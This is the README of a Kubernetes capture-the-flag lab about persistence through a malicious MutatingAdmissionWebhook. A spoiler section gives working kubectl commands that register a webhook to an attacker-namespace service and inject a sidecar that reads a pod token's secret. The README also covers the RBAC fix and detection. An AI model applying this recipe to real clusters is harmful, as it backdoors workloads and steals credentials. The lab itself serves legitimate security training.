# malicious-webhook - persistence via a MutatingAdmissionWebhook

The persistence capstone: an attacker who can create a `MutatingWebhookConfiguration`
backdoors **every future pod** the API server admits. The student registers the
webhook, re-rolls a target workload, and the injected sidecar reads the flag.

## Shape

The manifest bundle
(`services/backend/internal/labs/modules/malicious-webhook.yaml`) is **generated**
(see `gen.py` here) and large, because it carries the webhook server binary. All
pods use the shared `k8labs-foothold` image. The flag is bait (see `_template`).

## The one thing that made this lab different

It is the only lab needing a **running TLS server** (an admission webhook must
serve HTTPS). Rather than change the shared image, the server is a self-contained
stdlib-only Go binary (`webhook-server/main.go`, dual-arch) carried in the bundle
**gzipped + chunked as `binaryData` ConfigMaps and reassembled by an initContainer**
- so the lab stays pure YAML with no image change, the same airgap-friendly spirit
as `suid-privesc`'s embedded binary, just larger (~5 MB added to the backend
binary via `//go:embed`).

- **Chosen packaging (option A)**: ConfigMap-embedded binary. Self-contained,
  no infra rebuild, ships with the manifest.
- **Future refactor (option B)**: bake the `webhook` binary into the shared
  foothold image for a tiny manifest, reused by future TLS labs. See `AUTHORING.md`.
  Left as a deliberate follow-up so shipping this lab didn't force a shared-image
  change.

## The flaw

`lab/station` is granted `create` on `mutatingwebhookconfigurations` (cluster-wide)
plus delete/get pods and pods/log in `production` - and reads no secret itself. A
webhook server (`injector` in `attacker`) is pre-running. The student writes a
`MutatingWebhookConfiguration` wiring pod CREATE in `production` to it (CA bundle
mounted at `/etc/webhook-ca/ca.crt`), then deletes the `orders` pod; the Deployment
re-rolls it through the webhook, which injects an `audit` sidecar that reads the
flag with the pod's `production/app` token and logs it.

## Solution (spoiler)

```sh
CA=$(base64 -w0 /etc/webhook-ca/ca.crt)
kubectl apply -f - <<EOF
apiVersion: admissionregistration.k8s.io/v1
kind: MutatingWebhookConfiguration
metadata: { name: pwn }
webhooks:
  - name: inject.attacker.svc
    admissionReviewVersions: ["v1"]
    sideEffects: None
    failurePolicy: Ignore
    namespaceSelector: { matchLabels: { kubernetes.io/metadata.name: production } }
    rules: [{ operations: ["CREATE"], apiGroups: [""], apiVersions: ["v1"], resources: ["pods"] }]
    clientConfig:
      service: { namespace: attacker, name: injector, path: /mutate, port: 443 }
      caBundle: $CA
EOF
kubectl delete pod -n production -l app=orders
sleep 5
kubectl logs -n production -l app=orders -c audit
# k8labs{a_mutating_webhook_backdoors_every_admitted_pod}
```

## The fix

Treat `create`/`update` on `*webhookconfigurations` as cluster-admin-equivalent -
grant it to almost no one, and alert on any new/changed webhook configuration.
Admission is a trust boundary above per-object RBAC.

## Verification status

- **Verified**: the webhook server's AdmissionReview/JSONPatch logic (standalone
  over TLS), byte-identical dual-arch binary reassembly (gzip round-trip), and the
  student RBAC (`create mutatingwebhookconfigurations`, delete prod pods, no secret
  read; target `app` can read) via `kubectl auth can-i --as`.
- **Session-only**: the end-to-end injection (the API server calling the webhook
  over its Service DNS, cert SAN match, the roll, the sidecar read). This has more
  untested wiring than any other lab; the pieces are standard k8s and
  correct-by-construction, but the first real run should be watched. The course
  guides safe scoping (`namespaceSelector: production`, `failurePolicy: Ignore`) so
  a student can't wedge the nested cluster.

## What a defender sees

A new `MutatingWebhookConfiguration` in the audit log, then pods gaining a
container no author put there. Enumerate webhook configs early in any assessment.
